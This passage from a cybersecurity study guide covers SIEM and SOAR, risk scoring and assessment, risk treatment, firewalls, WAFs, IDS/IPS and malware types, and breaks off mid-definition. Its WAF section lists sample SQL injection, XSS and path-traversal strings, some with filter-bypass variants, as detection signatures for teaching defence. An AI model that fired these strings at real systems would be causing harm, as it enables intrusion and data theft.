├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ WHAT it ingests     │ Logs from everywhere      │ Alerts from SIEM + other │
│                     │ (firewall, AD, EDR,       │ security tools           │
│                     │ cloud, network, apps)     │                          │
├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ WHAT it outputs     │ Alerts / dashboards /     │ Automated actions /      │
│                     │ compliance reports /      │ enriched incidents /      │
│                     │ forensic search results   │ playbook execution logs  │
├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ Does it BLOCK       │ NO — alerts only          │ YES — calls other tools  │
│ threats?            │ (needs SOAR or human      │ to block, isolate,       │
│                     │ to take action)           │ disable, remediate       │
├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ Speed of response   │ Near real-time detection  │ Seconds (automated)      │
│                     │ (seconds to minutes)      │ vs 60+ min (manual)      │
├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ Core capability     │ Log storage + correlation │ Playbook automation +    │
│                     │ + rule engine + search    │ API orchestration        │
├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ Human role          │ Analyst reviews alerts    │ Analyst approves human-  │
│                     │ and investigates          │ decision steps only      │
├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ Where it stores     │ YES — massive log store   │ NO — incident data only  │
│ historical data?    │ (1–7 years retention)     │ (no raw log storage)     │
├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ Compliance role     │ PRIMARY — audit trails,   │ SECONDARY — documents    │
│                     │ reports, log retention    │ what response was taken  │
├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ ANALOGY             │ Security camera system    │ Security response team   │
│                     │ + alert board             │ + automated protocols    │
├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ Examples            │ Splunk, Sentinel, QRadar  │ Palo Alto XSOAR,         │
│                     │ LogRhythm, Elastic SIEM   │ Splunk SOAR, Swimlane,   │
│                     │                           │ IBM Resilient, Tines     │
└─────────────────────┴──────────────────────────┴──────────────────────────┘

KEY RULE TO REMEMBER:
  SIEM = EYES (detects and sees everything)
  SOAR = HANDS (acts on what the eyes see)
  
  Without SIEM, SOAR has nothing to respond to.
  Without SOAR, SIEM alerts pile up and analysts burn out.
  TOGETHER: a modern, scalable, 24/7 SOC capability.
```

### SOAR Products:

| Product | Vendor | Strength |
|---------|--------|----------|
| **Cortex XSOAR** | Palo Alto Networks | Most feature-rich, huge playbook library |
| **Splunk SOAR** | Splunk | Deep SIEM integration, Python-based playbooks |
| **IBM Security SOAR** | IBM | Enterprise compliance-focused |
| **Swimlane** | Swimlane | No-code/low-code playbook builder |
| **Tines** | Tines | Developer-friendly, lightweight |
| **Microsoft Sentinel** | Microsoft | Native SOAR via Playbooks (Logic Apps) |

---

# 9. Risk Formula & Risk Matrix

## 9.1 The Core Formula

```
        A × V × T
R =    ───────────
            C

R = Risk value
A = Asset value (how critical/valuable is the asset?)
V = Vulnerability score (CVSS score, severity of the weakness)
T = Threat score (capability and likelihood of threat actor)
C = Control effectiveness (how well do controls mitigate?)
```

### Component Scoring:

```
ASSET (A) — Value Scale 1-10:
  1-3:  Low value (internal test systems, non-critical services)
  4-6:  Medium value (internal business systems, non-PII data)
  7-9:  High value (customer data, financial systems, key IT systems)
  10:   Critical (Domain Controller, Certificate Authority, PCI systems)

VULNERABILITY (V) — CVSS Score 0-10:
  0-3.9:  Low severity vulnerability
  4-6.9:  Medium severity vulnerability
  7-8.9:  High severity vulnerability
  9-10:   Critical severity vulnerability

THREAT (T) — Capability × Likelihood Scale 1-10:
  1-3:  Low threat (no known threat actors targeting this system/sector)
  4-6:  Medium threat (known threat actors with relevant capabilities)
  7-9:  High threat (targeted sector, active campaigns detected)
  10:   Critical (known active exploitation in the wild, targeted campaign)

CONTROL (C) — Effectiveness Scale 1-10:
  1-3:  Minimal controls (basic AV, no monitoring)
  4-6:  Partial controls (some monitoring, basic hardening)
  7-9:  Strong controls (EDR, SIEM, patching, MFA)
  10:   Excellent controls (defense-in-depth, zero trust, 24/7 SOC)

  NOTE: C is in the DENOMINATOR — stronger controls = LOWER risk score.
        A control score of 1 (minimal) barely reduces risk.
        A control score of 10 (excellent) significantly reduces risk.
```

### Worked Example:

```
SCENARIO: Critical vulnerability in internet-facing web server
          that handles customer credit card data

Asset (A):       9   — Customer credit card server (very high value, PCI scope)
Vulnerability(V): 9.8 — SQL Injection (CVSS Critical, OWASP #1)
Threat (T):      8   — Financial cybercriminals actively exploiting SQLi
Control (C):     5   — WAF exists but not tuned; no patching for 60 days

        9 × 9.8 × 8
R =    ─────────────  =  141.12
              5

INTERPRETATION: Risk score 141 = CRITICAL RISK
ACTION: Emergency — patch immediately, tune WAF, consider taking offline
```

### Comparison After Adding Controls:

```
SAME SCENARIO after improving controls:

Asset (A):       9   — Same
Vulnerability(V): 9.8 — Same (before patch)
Threat (T):      8   — Same
Control (C):     9   — WAF tuned, SIEM monitoring, IPS deployed

        9 × 9.8 × 8
R =    ─────────────  =  78.4
              9

Risk reduced from 141 to 78 by improving controls BEFORE patching.
After patching: V becomes ~0 → Risk approaches 0.
```

---

## 9.2 Risk Matrix (Probability × Impact)

```
RISK MATRIX (5×5 Standard):

                         IMPACT
                Low    Med    High    Critical    Catastrophic
              ┌──────┬──────┬──────┬──────────┬─────────────┐
    Almost    │  M   │  H   │  H   │   CR     │     CR      │
    Certain   │      │      │      │          │             │
    (5)       └──────┴──────┴──────┴──────────┴─────────────┘
              ┌──────┬──────┬──────┬──────────┬─────────────┐
    Likely    │  M   │  M   │  H   │   CR     │     CR      │
    (4)       │      │      │      │          │             │
              └──────┴──────┴──────┴──────────┴─────────────┘
PROBABILITY   ┌──────┬──────┬──────┬──────────┬─────────────┐
              │  L   │  M   │  M   │    H     │     CR      │
    Possible  │      │      │      │          │             │
    (3)       └──────┴──────┴──────┴──────────┴─────────────┘
              ┌──────┬──────┬──────┬──────────┬─────────────┐
    Unlikely  │  L   │  L   │  M   │    H     │     H       │
    (2)       │      │      │      │          │             │
              └──────┴──────┴──────┴──────────┴─────────────┘
              ┌──────┬──────┬──────┬──────────┬─────────────┐
    Rare      │  L   │  L   │  L   │    M     │     M       │
    (1)       │      │      │      │          │             │
              └──────┴──────┴──────┴──────────┴─────────────┘

L = Low Risk (accept, monitor)
M = Medium Risk (plan remediation)
H = High Risk (remediate soon)
CR = Critical Risk (immediate action required)
```

---

# 10. Risk Assessment — 5-Step Process

Risk Assessment is the **systematic process of identifying, analyzing, and evaluating risks** to help an organization understand what they face and prioritize their response.

## Step 1: Scoping

**What it means:** Define the boundaries of what you are assessing.

```
SCOPING DECISIONS:

WHAT to include:
  • Which systems? (All production servers? Only PCI systems? All of IT?)
  • Which data? (All data? Only customer PII? Financial records?)
  • Which processes? (Only IT processes? Also physical security?)
  • Which locations? (HQ only? All offices? Remote workers?)
  
WHY scoping matters:
  • Too broad = impractical, too expensive, takes too long
  • Too narrow = risks outside scope are missed
  • Must align with business objectives and regulatory requirements
  
SCOPE STATEMENT EXAMPLE:
  "This risk assessment covers all internet-facing web applications,
   supporting database servers, and authentication infrastructure
   within the Production environment, with a focus on systems
   that process or store customer PII or payment card data,
   in compliance with PCI-DSS 4.0 requirements."
```

## Step 2: Risk Identification

**What it means:** Discover and document all relevant risks.

```
METHODS TO IDENTIFY RISKS:

Asset Inventory:
  → List all assets within scope
  → Identify what each asset does, who owns it, what data it handles

Threat Modeling:
  → For each asset, ask: "Who would want to attack this? How? Why?"
  → Use STRIDE model:
      S = Spoofing (impersonating)
      T = Tampering (modifying data)
      R = Repudiation (denying actions)
      I = Information Disclosure (leaking data)
      D = Denial of Service (disrupting availability)
      E = Elevation of Privilege (gaining unauthorized access)

Vulnerability Assessment:
  → Vulnerability scanning (Nessus, Qualys, OpenVAS)
  → Penetration testing
  → Code review
  → Configuration review

Historical Analysis:
  → Review past incidents in your organization
  → Review industry incidents (sector-specific threat intelligence)
  → Review CVE databases for known vulnerabilities in your tech stack

Expert Interviews:
  → Interview IT, developers, operations, legal, compliance teams
  → "What keeps you up at night? What could go wrong?"

OUTPUT: Risk Register (list of all identified risks with initial descriptions)
```

## Step 3: Risk Analysis

**What it means:** Evaluate the likelihood and impact of each identified risk.

```
FOR EACH RISK IN THE RISK REGISTER:

Determine LIKELIHOOD (Probability):
  • How often does this type of threat occur?
  • Does a viable threat actor exist with motivation and capability?
  • Is there an active exploit for this vulnerability?
  • Historical data: How often has this happened before?

Determine IMPACT:
  • What would be the financial loss?
  • What would be the operational disruption?
  • What would be the reputational damage?
  • What would be the regulatory consequences (fines, penalties)?
  • How many people/customers would be affected?

Calculate Risk Score:
  Risk = Likelihood × Impact

Consider existing controls:
  • What controls already exist?
  • Are they effective? Tested? Monitored?
  • Adjust likelihood and/or impact based on existing controls

OUTPUT: Risk Register updated with likelihood, impact, and risk scores
```

## Step 4: Risk Evaluation

**What it means:** Compare risk scores against the organization's **risk appetite** and **risk tolerance** to decide which risks require action.

```
RISK APPETITE:
  The AMOUNT of risk an organization is willing to ACCEPT to achieve its goals.
  
  Example: "Our organization is willing to accept LOW risks without treatment.
            MEDIUM risks require mitigation plans within 90 days.
            HIGH risks require immediate treatment within 30 days.
            CRITICAL risks require emergency treatment within 7 days."

RISK TOLERANCE:
  The SPECIFIC level of variation in risk outcomes that is acceptable.
  Risk tolerance is more specific than risk appetite.
  
  Example: "We tolerate up to $100,000 in annual losses from low-severity incidents."

RISK EVALUATION QUESTIONS:
  • Does this risk exceed our risk appetite?
  • What is the cost of treating this risk vs. the cost of the risk itself?
  • What is the regulatory requirement? (some risks MUST be addressed)
  • What is the priority order for treatment?
  
OUTPUT: Prioritized list of risks with recommended treatment options
```

## Step 5: Documentation

**What it means:** Record all findings in a structured, actionable format.

```
RISK ASSESSMENT REPORT INCLUDES:

Executive Summary:
  • Overall security posture
  • Top 5 risks requiring immediate action
  • Key recommendations

Risk Register:
  ┌─────────────────────────────────────────────────────────────────────┐
  │ ID │ Risk Description │ Asset │ Threat │ Likelihood │ Impact │ Score│
  ├─────────────────────────────────────────────────────────────────────┤
  │ R1 │ SQL Injection in │  Web  │  Ext.  │    High    │ Critical│  CR │
  │    │ Customer Portal  │ Server│ Actors │            │         │     │
  ├─────────────────────────────────────────────────────────────────────┤
  │ R2 │ Ransomware via   │  All  │Criminal│   Medium   │Catastroph│ H  │
  │    │ Phishing Email   │ endpoints│ orgs│            │   ic    │     │
  ├─────────────────────────────────────────────────────────────────────┤
  │ R3 │ Insider data     │  DB   │ Insider│    Low     │  High   │  M  │
  │    │ exfiltration     │ Server│       │            │         │     │
  └─────────────────────────────────────────────────────────────────────┘

Treatment Plans:
  For each HIGH/CRITICAL risk:
  • Recommended treatment option (Mitigate/Transfer/Accept/Avoid)
  • Specific actions required
  • Owner (who is responsible)
  • Deadline (when must it be done)
  • Success criteria (how will we know it's done?)

Residual Risk:
  What risk remains AFTER treatment is applied?
  Must be within risk appetite.

Review Schedule:
  When will this assessment be repeated?
  (Typical: annually, or after significant changes)
```

---

# 11. Risk Assessment Types

## 11.1 Qualitative Risk Assessment

```
DEFINITION:
Uses subjective judgment and descriptive scales (Low/Medium/High/Critical)
rather than precise numerical values.

PROCESS:
  • Expert interviews and workshops
  • Scoring based on experience and judgment
  • Risk matrix: Probability (1-5) × Impact (1-5)
  
ADVANTAGES:
  ✅ Faster and cheaper to conduct
  ✅ No complex financial modeling required
  ✅ Works well when data is scarce
  ✅ Easier to communicate to non-technical stakeholders
  ✅ Good for initial assessments and broad scoping

DISADVANTAGES:
  ❌ Subjective — different assessors may get different results
  ❌ Cannot calculate precise financial impact (ROI on controls)
  ❌ Difficult to compare risks across different categories
  ❌ "High" risk means different things to different people

WHEN TO USE:
  • Initial risk assessment of a new program
  • Small organizations without actuarial data
  • Non-technical risk areas (reputation, compliance)
  • Time-constrained assessments

EXAMPLE OUTPUT:
  "The risk of ransomware attack is HIGH (4/5 probability × 5/5 impact)"
```

## 11.2 Quantitative Risk Assessment

```
DEFINITION:
Uses specific numerical values and financial metrics to calculate risk.
Everything is expressed in monetary terms.

KEY CONCEPTS:
  Asset Value (AV):           $500,000 (replacement + data value)
  Exposure Factor (EF):       60%      (% of asset lost in incident)
  Single Loss Expectancy:     AV × EF = $300,000 per incident
  Annualized Rate of Occurrence (ARO): 0.3 (happens once every ~3 years)
  Annual Loss Expectancy (ALE):        SLE × ARO = $90,000/year

CONTROL COST ANALYSIS:
  ALE before control:   $90,000/year
  Control annual cost:  $20,000/year
  ALE after control:    $10,000/year (control is 90% effective)
  
  Value of Control = ALE_before - ALE_after - Control_cost
  Value of Control = $90,000 - $10,000 - $20,000 = $60,000 net benefit
  
  Decision: IMPLEMENT the control (saves $60K/year net)

ADVANTAGES:
  ✅ Precise, objective — less subject to interpretation
  ✅ Enables ROI calculation on security investments
  ✅ Enables cost-benefit analysis of controls
  ✅ Better for executive/board communication ($ figures)
  ✅ Enables comparison across different risk types

DISADVANTAGES:
  ❌ Requires extensive data (historical incident rates, valuations)
  ❌ Time-consuming and expensive
  ❌ False precision — garbage in, garbage out
  ❌ Difficult to quantify intangibles (reputation, morale)
  ❌ May not account for catastrophic/rare events well

WHEN TO USE:
  • Organizations with mature security programs and historical data
  • High-stakes investment decisions (large control purchases)
  • Regulatory/audit requirements for quantitative analysis
  • Cyber insurance premium calculations
```

## 11.3 Semi-Quantitative Risk Assessment

```
HYBRID APPROACH:
Combines qualitative descriptors with numerical values for calculation.

Example: Map qualitative ratings to numerical scores:
  Probability:  Rare=1, Unlikely=2, Possible=3, Likely=4, Almost Certain=5
  Impact:       Negligible=1, Minor=2, Moderate=3, Major=4, Catastrophic=5
  
  Risk Score = Probability × Impact (1-25 scale)
  
  1-4:   Low
  5-9:   Medium
  10-19: High
  20-25: Critical

Most widely used in practice — balances rigor with practicality.
```

---

# 12. How to Address Risk

## 12.1 The Four Risk Treatment Options

```
RISK TREATMENT OPTIONS:

Given a risk, you have exactly FOUR choices:

1. MITIGATE    — Reduce the risk (implement controls)
2. TRANSFER    — Shift the risk to someone else (insurance, outsourcing)
3. ACCEPT      — Acknowledge the risk and do nothing (within risk appetite)
4. AVOID       — Eliminate the risk by removing the activity that causes it
```

### 12.1.1 MITIGATE (Reduce)

```
DEFINITION: Implement security controls to reduce likelihood or impact.

HOW:
  Security Frameworks:
    • Implement ISO 27001 control framework
    • Apply NIST CSF (Cybersecurity Framework)
    • Follow CIS Controls (Center for Internet Security)
    
  Security Controls:
    • Deploy EDR to detect and respond to malware
    • Implement MFA to prevent credential attacks
    • Enable WAF to block web attacks
    • Patch systems regularly to close vulnerabilities
    
  Policies:
    • Create password policy (complexity, rotation)
    • Implement acceptable use policy
    • Establish incident response plan

WHEN TO USE:
  • Risk exceeds risk appetite
  • Cost of control < Cost of risk (positive ROI)
  • Regulatory requirement mandates specific controls

EXAMPLE:
  Risk: Phishing attacks leading to credential theft (HIGH risk)
  Mitigation: Deploy email security gateway + MFA + security awareness training
  Result: Risk reduced from HIGH to LOW (lower likelihood + lower impact)
```

### 12.1.2 TRANSFER (Share)

```
DEFINITION: Shift financial or operational responsibility for the risk to a third party.

HOW:
  Insurance (Cyber Insurance):
    • Pays out if a breach occurs
    • Covers: breach response costs, legal fees, regulatory fines, PR costs, 
      ransomware payments, business interruption losses
    • Does NOT remove the risk — just transfers financial burden
    
  Assurance Services:
    • Third-party security assessments (penetration testing)
    • SOC 2 audits (demonstrates controls to customers)
    • Guarantees from vendors
    
  Security Services (Outsourcing):
    • MDR/MSSP takes on monitoring responsibility
    • Contractual SLA means THEY bear responsibility for response times
    
  3rd Party Contracts:
    • SLAs with cloud providers (AWS, Azure SLA guarantees uptime)
    • Vendor indemnification clauses
    • Supply chain risk transfer via contracts

WHEN TO USE:
  • Risk is too costly to mitigate internally
  • Cost of transfer < Cost of risk
  • Risk is within industry norms for transfer (cyber insurance is standard)
  • Specialized expertise required (use an expert MSSP instead)

LIMITATIONS:
  Transfer does NOT eliminate the risk!
  • Reputational damage still falls on YOU (not the insurer)
  • Regulatory responsibility cannot be fully transferred
  • Customer trust is YOUR problem regardless of insurance
```

### 12.1.3 ACCEPT

```
DEFINITION: Acknowledge the risk exists and consciously decide to do nothing.
            The risk stays as-is.

WHEN APPROPRIATE:
  • Risk score is BELOW risk appetite threshold
  • Cost of treatment > Cost of risk (negative ROI)
  • Risk is so unlikely as to be statistically negligible
  • Residual risk after other treatments — some risk always remains

COST-BENEFIT ANALYSIS FOR ACCEPTANCE:
  ALE (Annual Loss Expectancy): $5,000/year
  Cost of control: $50,000/year
  
  If ALE < Control Cost: ACCEPT the risk.
  Spending $50K to prevent $5K of expected loss = bad business decision.

IMPORTANT: Acceptance must be FORMAL and DOCUMENTED:
  • Risk Owner must sign off on the decision
  • Board/executive approval for high risks
  • Regular review (annual) to check if circumstances have changed
  • Cannot accept HIGH or CRITICAL risks without exceptional justification

DANGER: Many organizations "accept" risks by doing nothing —
        that is not acceptance, that is NEGLIGENCE.
        True acceptance requires conscious decision + documentation.
```

### 12.1.4 AVOID

```
DEFINITION: Eliminate the risk entirely by stopping the activity that creates it.

HOW:
  • Don't collect data you don't need (reduces breach risk)
  • Don't use a vulnerable technology (use safer alternative)
  • Don't connect a system to the internet (eliminates remote attack surface)
  • Don't enter a market segment with unacceptable cyber risk
  • Discontinue a service with too much cyber exposure

COST-BENEFIT ANALYSIS FOR AVOIDANCE:
  The activity creating the risk must be worth LESS than the risk cost.
  If risk > benefit: AVOID the activity.

EXAMPLES:
  • Company decides not to accept cryptocurrency payments
    → Eliminates risk of cryptocurrency payment fraud
    
  • Hospital decides not to put patient record system on internet
    → Eliminates remote attack risk (air-gapped system)
    
  • Company decides not to store credit card data at all
    → Tokenize payments via processor — eliminates PCI-DSS scope
    
  • Organization stops using legacy system with unfixable vulnerability
    → Eliminates that specific attack vector

LIMITATIONS:
  • Sometimes you cannot avoid the risk and still run the business
  • Avoiding one risk may create another
  • May result in missed business opportunities
```

---

# 13. Security Controls Catalogue

## 13.1 Security Appliances

### Firewall — Complete Reference

```
TYPES OF FIREWALLS:

Packet Filter Firewall (Layer 3/4):
  Inspects: Source IP, Destination IP, Port, Protocol
  Cannot inspect: Packet contents, application data
  Speed: Very fast
  Example rule: DENY TCP from 0.0.0.0/0 to 10.0.0.1 port 22

Stateful Inspection Firewall (Layer 3/4 + state):
  Tracks: Connection state table (SYN/SYN-ACK/ACK)
  Allows: Return traffic only for established connections
  Blocks: Unsolicited inbound packets
  Example: Cisco ASA, pfSense, iptables with conntrack

Application Layer Firewall (Layer 7):
  Inspects: HTTP/HTTPS, DNS, FTP, SMTP content
  Understands: Protocols, can detect malformed HTTP headers
  Performance: Slower due to deep inspection

Next-Generation Firewall (NGFW):
  Combines: Stateful + App-aware + IPS + SSL/TLS decryption
  Features:
    • Application identification (knows it's Netflix vs generic HTTPS)
    • User identity mapping (who is this IP address?)
    • URL filtering (category-based blocking)
    • SSL/TLS inspection (decrypts HTTPS for analysis)
    • Integrated IPS signatures
  Examples: Palo Alto PA-Series, Fortinet FortiGate, Check Point

Firewall Rule Best Practices:
  1. Default-deny: "Block everything unless explicitly allowed"
  2. Least privilege: Allow only minimum required traffic
  3. Rule cleanup: Remove unused rules regularly
  4. Logging: Log ALL denied traffic, log critical allowed traffic
  5. Testing: Test rules before deploying to production
  6. Document: Every rule must have owner, purpose, review date
```

### WAF — Web Application Firewall

```
WAF DETECTION SIGNATURES (Examples):

SQL Injection Signatures:
  • Detect: ' OR '1'='1  
  • Detect: '; DROP TABLE users; --
  • Detect: UNION SELECT username, password FROM users
  • Detect: 1=1, OR 1=1, AND 1=1 patterns

XSS Signatures:
  • Detect: <script>
  • Detect: javascript:
  • Detect: onload=, onclick=, onerror= event handlers
  • Detect: eval(), document.cookie patterns

Path Traversal Signatures:
  • Detect: ../../../etc/passwd
  • Detect: %2e%2e%2f (URL encoded ../)
  • Detect: ....// (double dot bypass attempts)

WAF Bypass Techniques (Red Team):
  • Case variation: <ScRiPt>alert(1)</sCrIpT>
  • URL encoding: %3Cscript%3E
  • HTML entities: &#60;script&#62;
  • Null bytes: %00
  • Content-Type confusion
  These bypasses help organizations tune WAF rules.
```

### IDS/IPS — Host and Network

```
NIDS (Network IDS):
  Deployment: Passive (SPAN port, TAP) — does not affect traffic flow
  Scope: All network traffic it can see
  Response: ALERT only (detection, not prevention)
  Best for: Network-level threat visibility

NIPS (Network IPS):
  Deployment: INLINE — all traffic passes through it
  Scope: All network traffic flowing through it
  Response: ALERT + BLOCK (drop malicious packets)
  Best for: Active prevention, not just detection
  Risk: Can cause outages if misconfigured (false positives block legit traffic)

HIDS (Host IDS):
  Deployment: Agent on endpoint
  Scope: All activity on THAT specific host
  Detects: File changes (FIM), log anomalies, process behavior
  Examples: OSSEC, Wazuh, Tripwire (file integrity monitoring)
  
HIPS (Host IPS):
  Deployment: Agent on endpoint
  Scope: All activity on THAT specific host
  Response: BLOCK suspicious processes, file writes, registry changes
  Example: Behavior-blocking in modern AV/EDR

IDS/IPS TUNING CHALLENGE:
  Too sensitive: Too many false positives → alert fatigue → analysts ignore alerts
  Too loose: Misses actual attacks
  
  Solution: Baseline → tune → monitor → re-tune continuously
```

---

# 14. Malware — Complete Guide

## 14.1 What is Malware?

**Definition:** Malware (Malicious Software) is any software intentionally designed to cause damage, disruption, or unauthorized access to computer systems, networks, or data. It encompasses any code that performs actions harmful to the interests of the owner of the affected system.

```
MALWARE = Malicious + Software

Key distinction:
  Vulnerability = The WEAKNESS (passive)
  Malware       = The WEAPON (active — it does things)
  
Malware is the TOOL attackers use to EXPLOIT vulnerabilities.
```

## 14.2 Malware Types — Deep Dive

### Virus

```
DEFINITION:
A virus is malware that ATTACHES itself to legitimate files/programs
and REPLICATES when the infected file is executed.

CHARACTERISTICS:
  • Requires a HOST (cannot exist alone — must infect another file)
  • Requires USER ACTION to spread (someone must run the infected file)
  • Self-replicating (copies itself into other files when it runs)
  • Can carry a PAYLOAD (destructive action beyond replication)

INFECTION MECHANISM:
  1. Infected file (e.g., game.exe) is downloaded
  2. User runs game.exe
  3. Virus code executes:
     a) Virus replicates into other .exe files in the folder
     b) Virus executes payload (delete files, corrupt data, etc.)
  4. Infected files are shared/sent to others → further spread

TYPES:
  File Virus:       Infects executable files (.exe, .dll, .com)
  Boot Sector Virus: Infects the Master Boot Record (MBR)
  Macro Virus:      Infects Office documents (Word, Excel macros)
                    Example: Melissa virus (1999) — spread via Word docs
  Polymorphic Virus: Changes its code signature on each infection
                     (evades signature-based AV detection)
  Metamorphic Virus: Completely rewrites itself on each infection
                     (even harder to detect than polymorphic)

HISTORICAL EXAMPLE:
  ILOVEYOU Worm/Virus (2000):
  • Spread via email attachment: LOVE-LETTER-FOR-YOU.TXT.vbs
  • VBScript virus masquerading as a text file
  • Infected 45 million+ computers in 10 days
  • Caused $10 billion in damage
  • Overwrote media files (photos, music) with copies of itself
```

### Worm

```
DEFINITION:
A worm is self-replicating malware that spreads INDEPENDENTLY across networks
WITHOUT requiring a host file or user interaction.

KEY DIFFERENCE FROM VIRUS:
  Virus:  Needs a host file + user action to spread
  Worm:   Spreads on its OWN through networks — no user needed

SPREAD MECHANISMS:
  • Network shares (SMB)
  • Email (sends itself to contacts)
  • Vulnerability exploitation (connects to remote systems, exploits bug)
  • Removable media (auto-run from USB)
  • Instant messaging

PROPAGATION EXAMPLE (WannaCry Worm):
  1. Worm enters one machine (often via phishing)
  2. Worm scans internal network for machines with port 445 open
  3. Finds target → exploits EternalBlue (MS17-010 SMB vulnerability)
  4. Copies itself to new machine
  5. Repeats steps 2-4 on new machine → EXPONENTIAL spread
  6. In WannaCry: 230,000 machines infected in 24 hours across 150 countries

FAMOUS WORMS:
  WannaCry (2017)   — Ransomware worm using EternalBlue
  NotPetya (2017)   — Destructive worm disguised as ransomware ($10B damage)
  Conficker (2008)  — 15 million infected, largest botnet
  Slammer (2003)    — Infected 75,000 servers in 10 minutes (SQL Server vuln)
  Morris Worm (1988) — First major internet worm (Cornell student, experimental)
```

### Trojan Horse (Trojan)

```
DEFINITION:
A Trojan is malware disguised as legitimate, desirable software.
It does NOT self-replicate — users are tricked into installing it themselves.

NAME ORIGIN: Like the Trojan Horse of Greek mythology — appears as a gift,
             hides attackers inside.

CHARACTERISTICS:
  • Appears legitimate (game, utility, software crack, PDF viewer)
  • Does not self-replicate (user must manually install/run it)
  • Contains hidden malicious functionality
  • Establishes attacker access or drops additional malware

TYPES:
  Remote Access Trojan (RAT):
    • Gives attacker FULL remote control of the victim's machine
    • Capabilities: Screenshot, keylogger, webcam access, file management
    • Examples: DarkComet, njRAT, QuasarRAT, Cobalt Strike Beacon

  Banking Trojan:
    • Steals financial credentials (online banking, payment cards)
    • Man-in-the-Browser: Modifies banking pages in browser memory
    • Examples: Zeus, Emotet, TrickBot, Dridex

  Downloader/Dropper Trojan:
    • Downloads and installs additional malware
    • First stage payload → fetches second stage (ransomware, RAT)
    • Examples: Emotet (loader), IcedID, Qbot

  Rootkit Trojan:
    • Hides itself and other malware from the OS and security tools
    • Modifies OS functions to hide its presence

INFECTION VECTORS:
  • Cracked software / pirated games (most common)
  • Malicious email attachments
  • Fake browser updates
  • Malicious ads (malvertising)
  • Supply chain compromise (legitimate software Trojanized)
  
EXAMPLE:
  SolarWinds SUNBURST (2020):
  • Attackers modified SolarWinds Orion software update
  • 18,000 organizations installed the Trojanized update
  • Backdoor activated on their networks — largest supply chain attack
```

### Ransomware

```
DEFINITION:
Ransomware is malware that encrypts victim's files or systems and demands
payment (ransom) to restore access.

OPERATION:
  Phase 1: Initial Access
    → Phishing email, exploit, stolen RDP credentials, supply chain
    
  Phase 2: Execution and Persistence
    → Ransomware executes, establishes persistence
    
  Phase 3: Reconnaissance (modern ransomware)
    → Maps network, finds domain controllers, backup systems
    → Identifies and exfiltrates sensitive data BEFORE encrypting
    
  Phase 4: Staging
    → Disables backup solutions (VSS shadow copies)
    → Disables AV/EDR
    → Deploys ransomware to all endpoints simultaneously
    
  Phase 5: Encryption
    → Encrypts files (AES-256 for files, RSA-4096 for the AES key)
    → Only attacker has the RSA private key → cannot decrypt without it
    → Renames files with .locked, .enc, .WNCRY extensions
    
  Phase 6: Extortion
    → Ransom note dropped (README.txt, DECRYPT_INSTRUCTIONS.html)
    → "Pay X Bitcoin to [address] within 72 hours or price doubles"
    → Modern: DOUBLE EXTORTION — "Pay or we publish your stolen data"
    → Modern: TRIPLE EXTORTION — Also threatening customers/employees

RANSOMWARE-AS-A-SERVICE (RaaS):
  Operators: Develop and maintain the ransomware
  Affiliates: Conduct the actual attacks
  Revenue split: 70-80% to affiliate, 20-30% to operator
  
  Famous RaaS operations:
  • REvil (Sodinokibi) — $70M Kaseya attack demand
  • Conti — $180M annual revenue
  • LockBit 3.0 — Most active 2022-2023
  • ALPHV/BlackCat — Cross-platform (Windows, Linux, VMware ESXi)

ENCRYPTION MECHANICS:
  AES-256 (symmetric) → fast, encrypts file content
  RSA-4096 (asymmetric) → encrypts the AES key
  Hybrid approach:
    • Generate random AES key for each file
    • Encrypt file with AES key
    • Encrypt AES key with attacker's RSA public key
    • Only attacker's RSA private key can recover AES key → decrypt files

PROTECTION:
  • Offline, tested backups (3-2-1 rule: 3 copies, 2 media types, 1 offsite)
  • EDR with behavioral detection (ransomware behavior = rapid file encryption)
  • Network segmentation (limit spread)
  • Least privilege (limit files accessible to any one account)
  • Disable RDP if not needed (major initial access vector)
  • MFA on all remote access
```

### Spyware

```
DEFINITION:
Spyware is malware that secretly monitors user activity and collects
sensitive information WITHOUT the user's knowledge or consent.

CAPABILITIES:
  Keylogger:
    • Records every keystroke
    • Captures passwords as typed
    • Captures credit card numbers, PINs, private messages
    
  Screen Capture:
    • Takes periodic screenshots
    • Records what's on the screen
    
  Browser History/Credential Theft:
    • Extracts saved passwords from browser
    • Records visited websites
    • Steals session cookies (allows account takeover without password)
    
  Webcam/Microphone Access:
    • Activates camera without indicator light
    • Records audio conversations
    
  File Exfiltration:
    • Searches for and uploads documents, spreadsheets
    • Specifically targets password files, crypto wallets
    
  Communication Interception:
    • Captures emails, chat messages
    • Records phone calls on mobile spyware

FAMOUS SPYWARE:
  Pegasus (NSO Group):
    • Nation-state grade mobile spyware
    • Zero-click exploitation (no user action needed!)
    • Targets: Journalists, activists, politicians
    • Full iPhone/Android compromise
    
  FinFisher/FinSpy:
    • Commercial spyware sold to governments
    • Full surveillance capability

DETECTION EVASION:
  • Runs as background process with legitimate-sounding name
  • Encrypts stolen data before transmission
  • Transmits data in small bursts to avoid detection
  • Rootkit capabilities to hide from process lists
```

---

# 15. Bug vs Vulnerability vs Malware vs Zero Day

## 15.1 Bug

```
DEFINITION:
A bug is a flaw or error in software code that causes it to behave
UNEXPECTEDLY or INCORRECTLY — but NOT necessarily in a way that creates
a security risk.

CHARACTERISTICS:
  • Can be a logic error, off-by-one error, null pointer, etc.
  • Usually causes: crashes, incorrect output, unexpected behavior
  • May or may not be exploitable for security purposes
  • Reported through normal bug tracking (Jira, GitHub Issues)
  • Fixed in regular software updates

EXAMPLES:
  • Calculator app displays wrong result due to floating point error
  • Web app times out under heavy load (performance bug)
  • Form accepts letters in a phone number field (validation bug)
  • App crashes when username has special characters

SECURITY RELEVANCE:
  • Most bugs are NOT security vulnerabilities
  • Some bugs BECOME vulnerabilities when they can be exploited
  • Buffer overflow bugs → exploitable vulnerability
  
  The path: Bug → (if exploitable) → Vulnerability → (if exploited) → Exploitation
```

## 15.2 Vulnerability

```
DEFINITION:
A vulnerability is a weakness in a system, software, or process
that can be EXPLOITED by a threat actor to compromise security.

KEY DISTINCTION FROM BUG:
  Bug:           Code doesn't work as intended (could be harmless)
  Vulnerability: Can be exploited to cause a security breach

REQUIREMENTS FOR A VULNERABILITY:
  1. A flaw exists
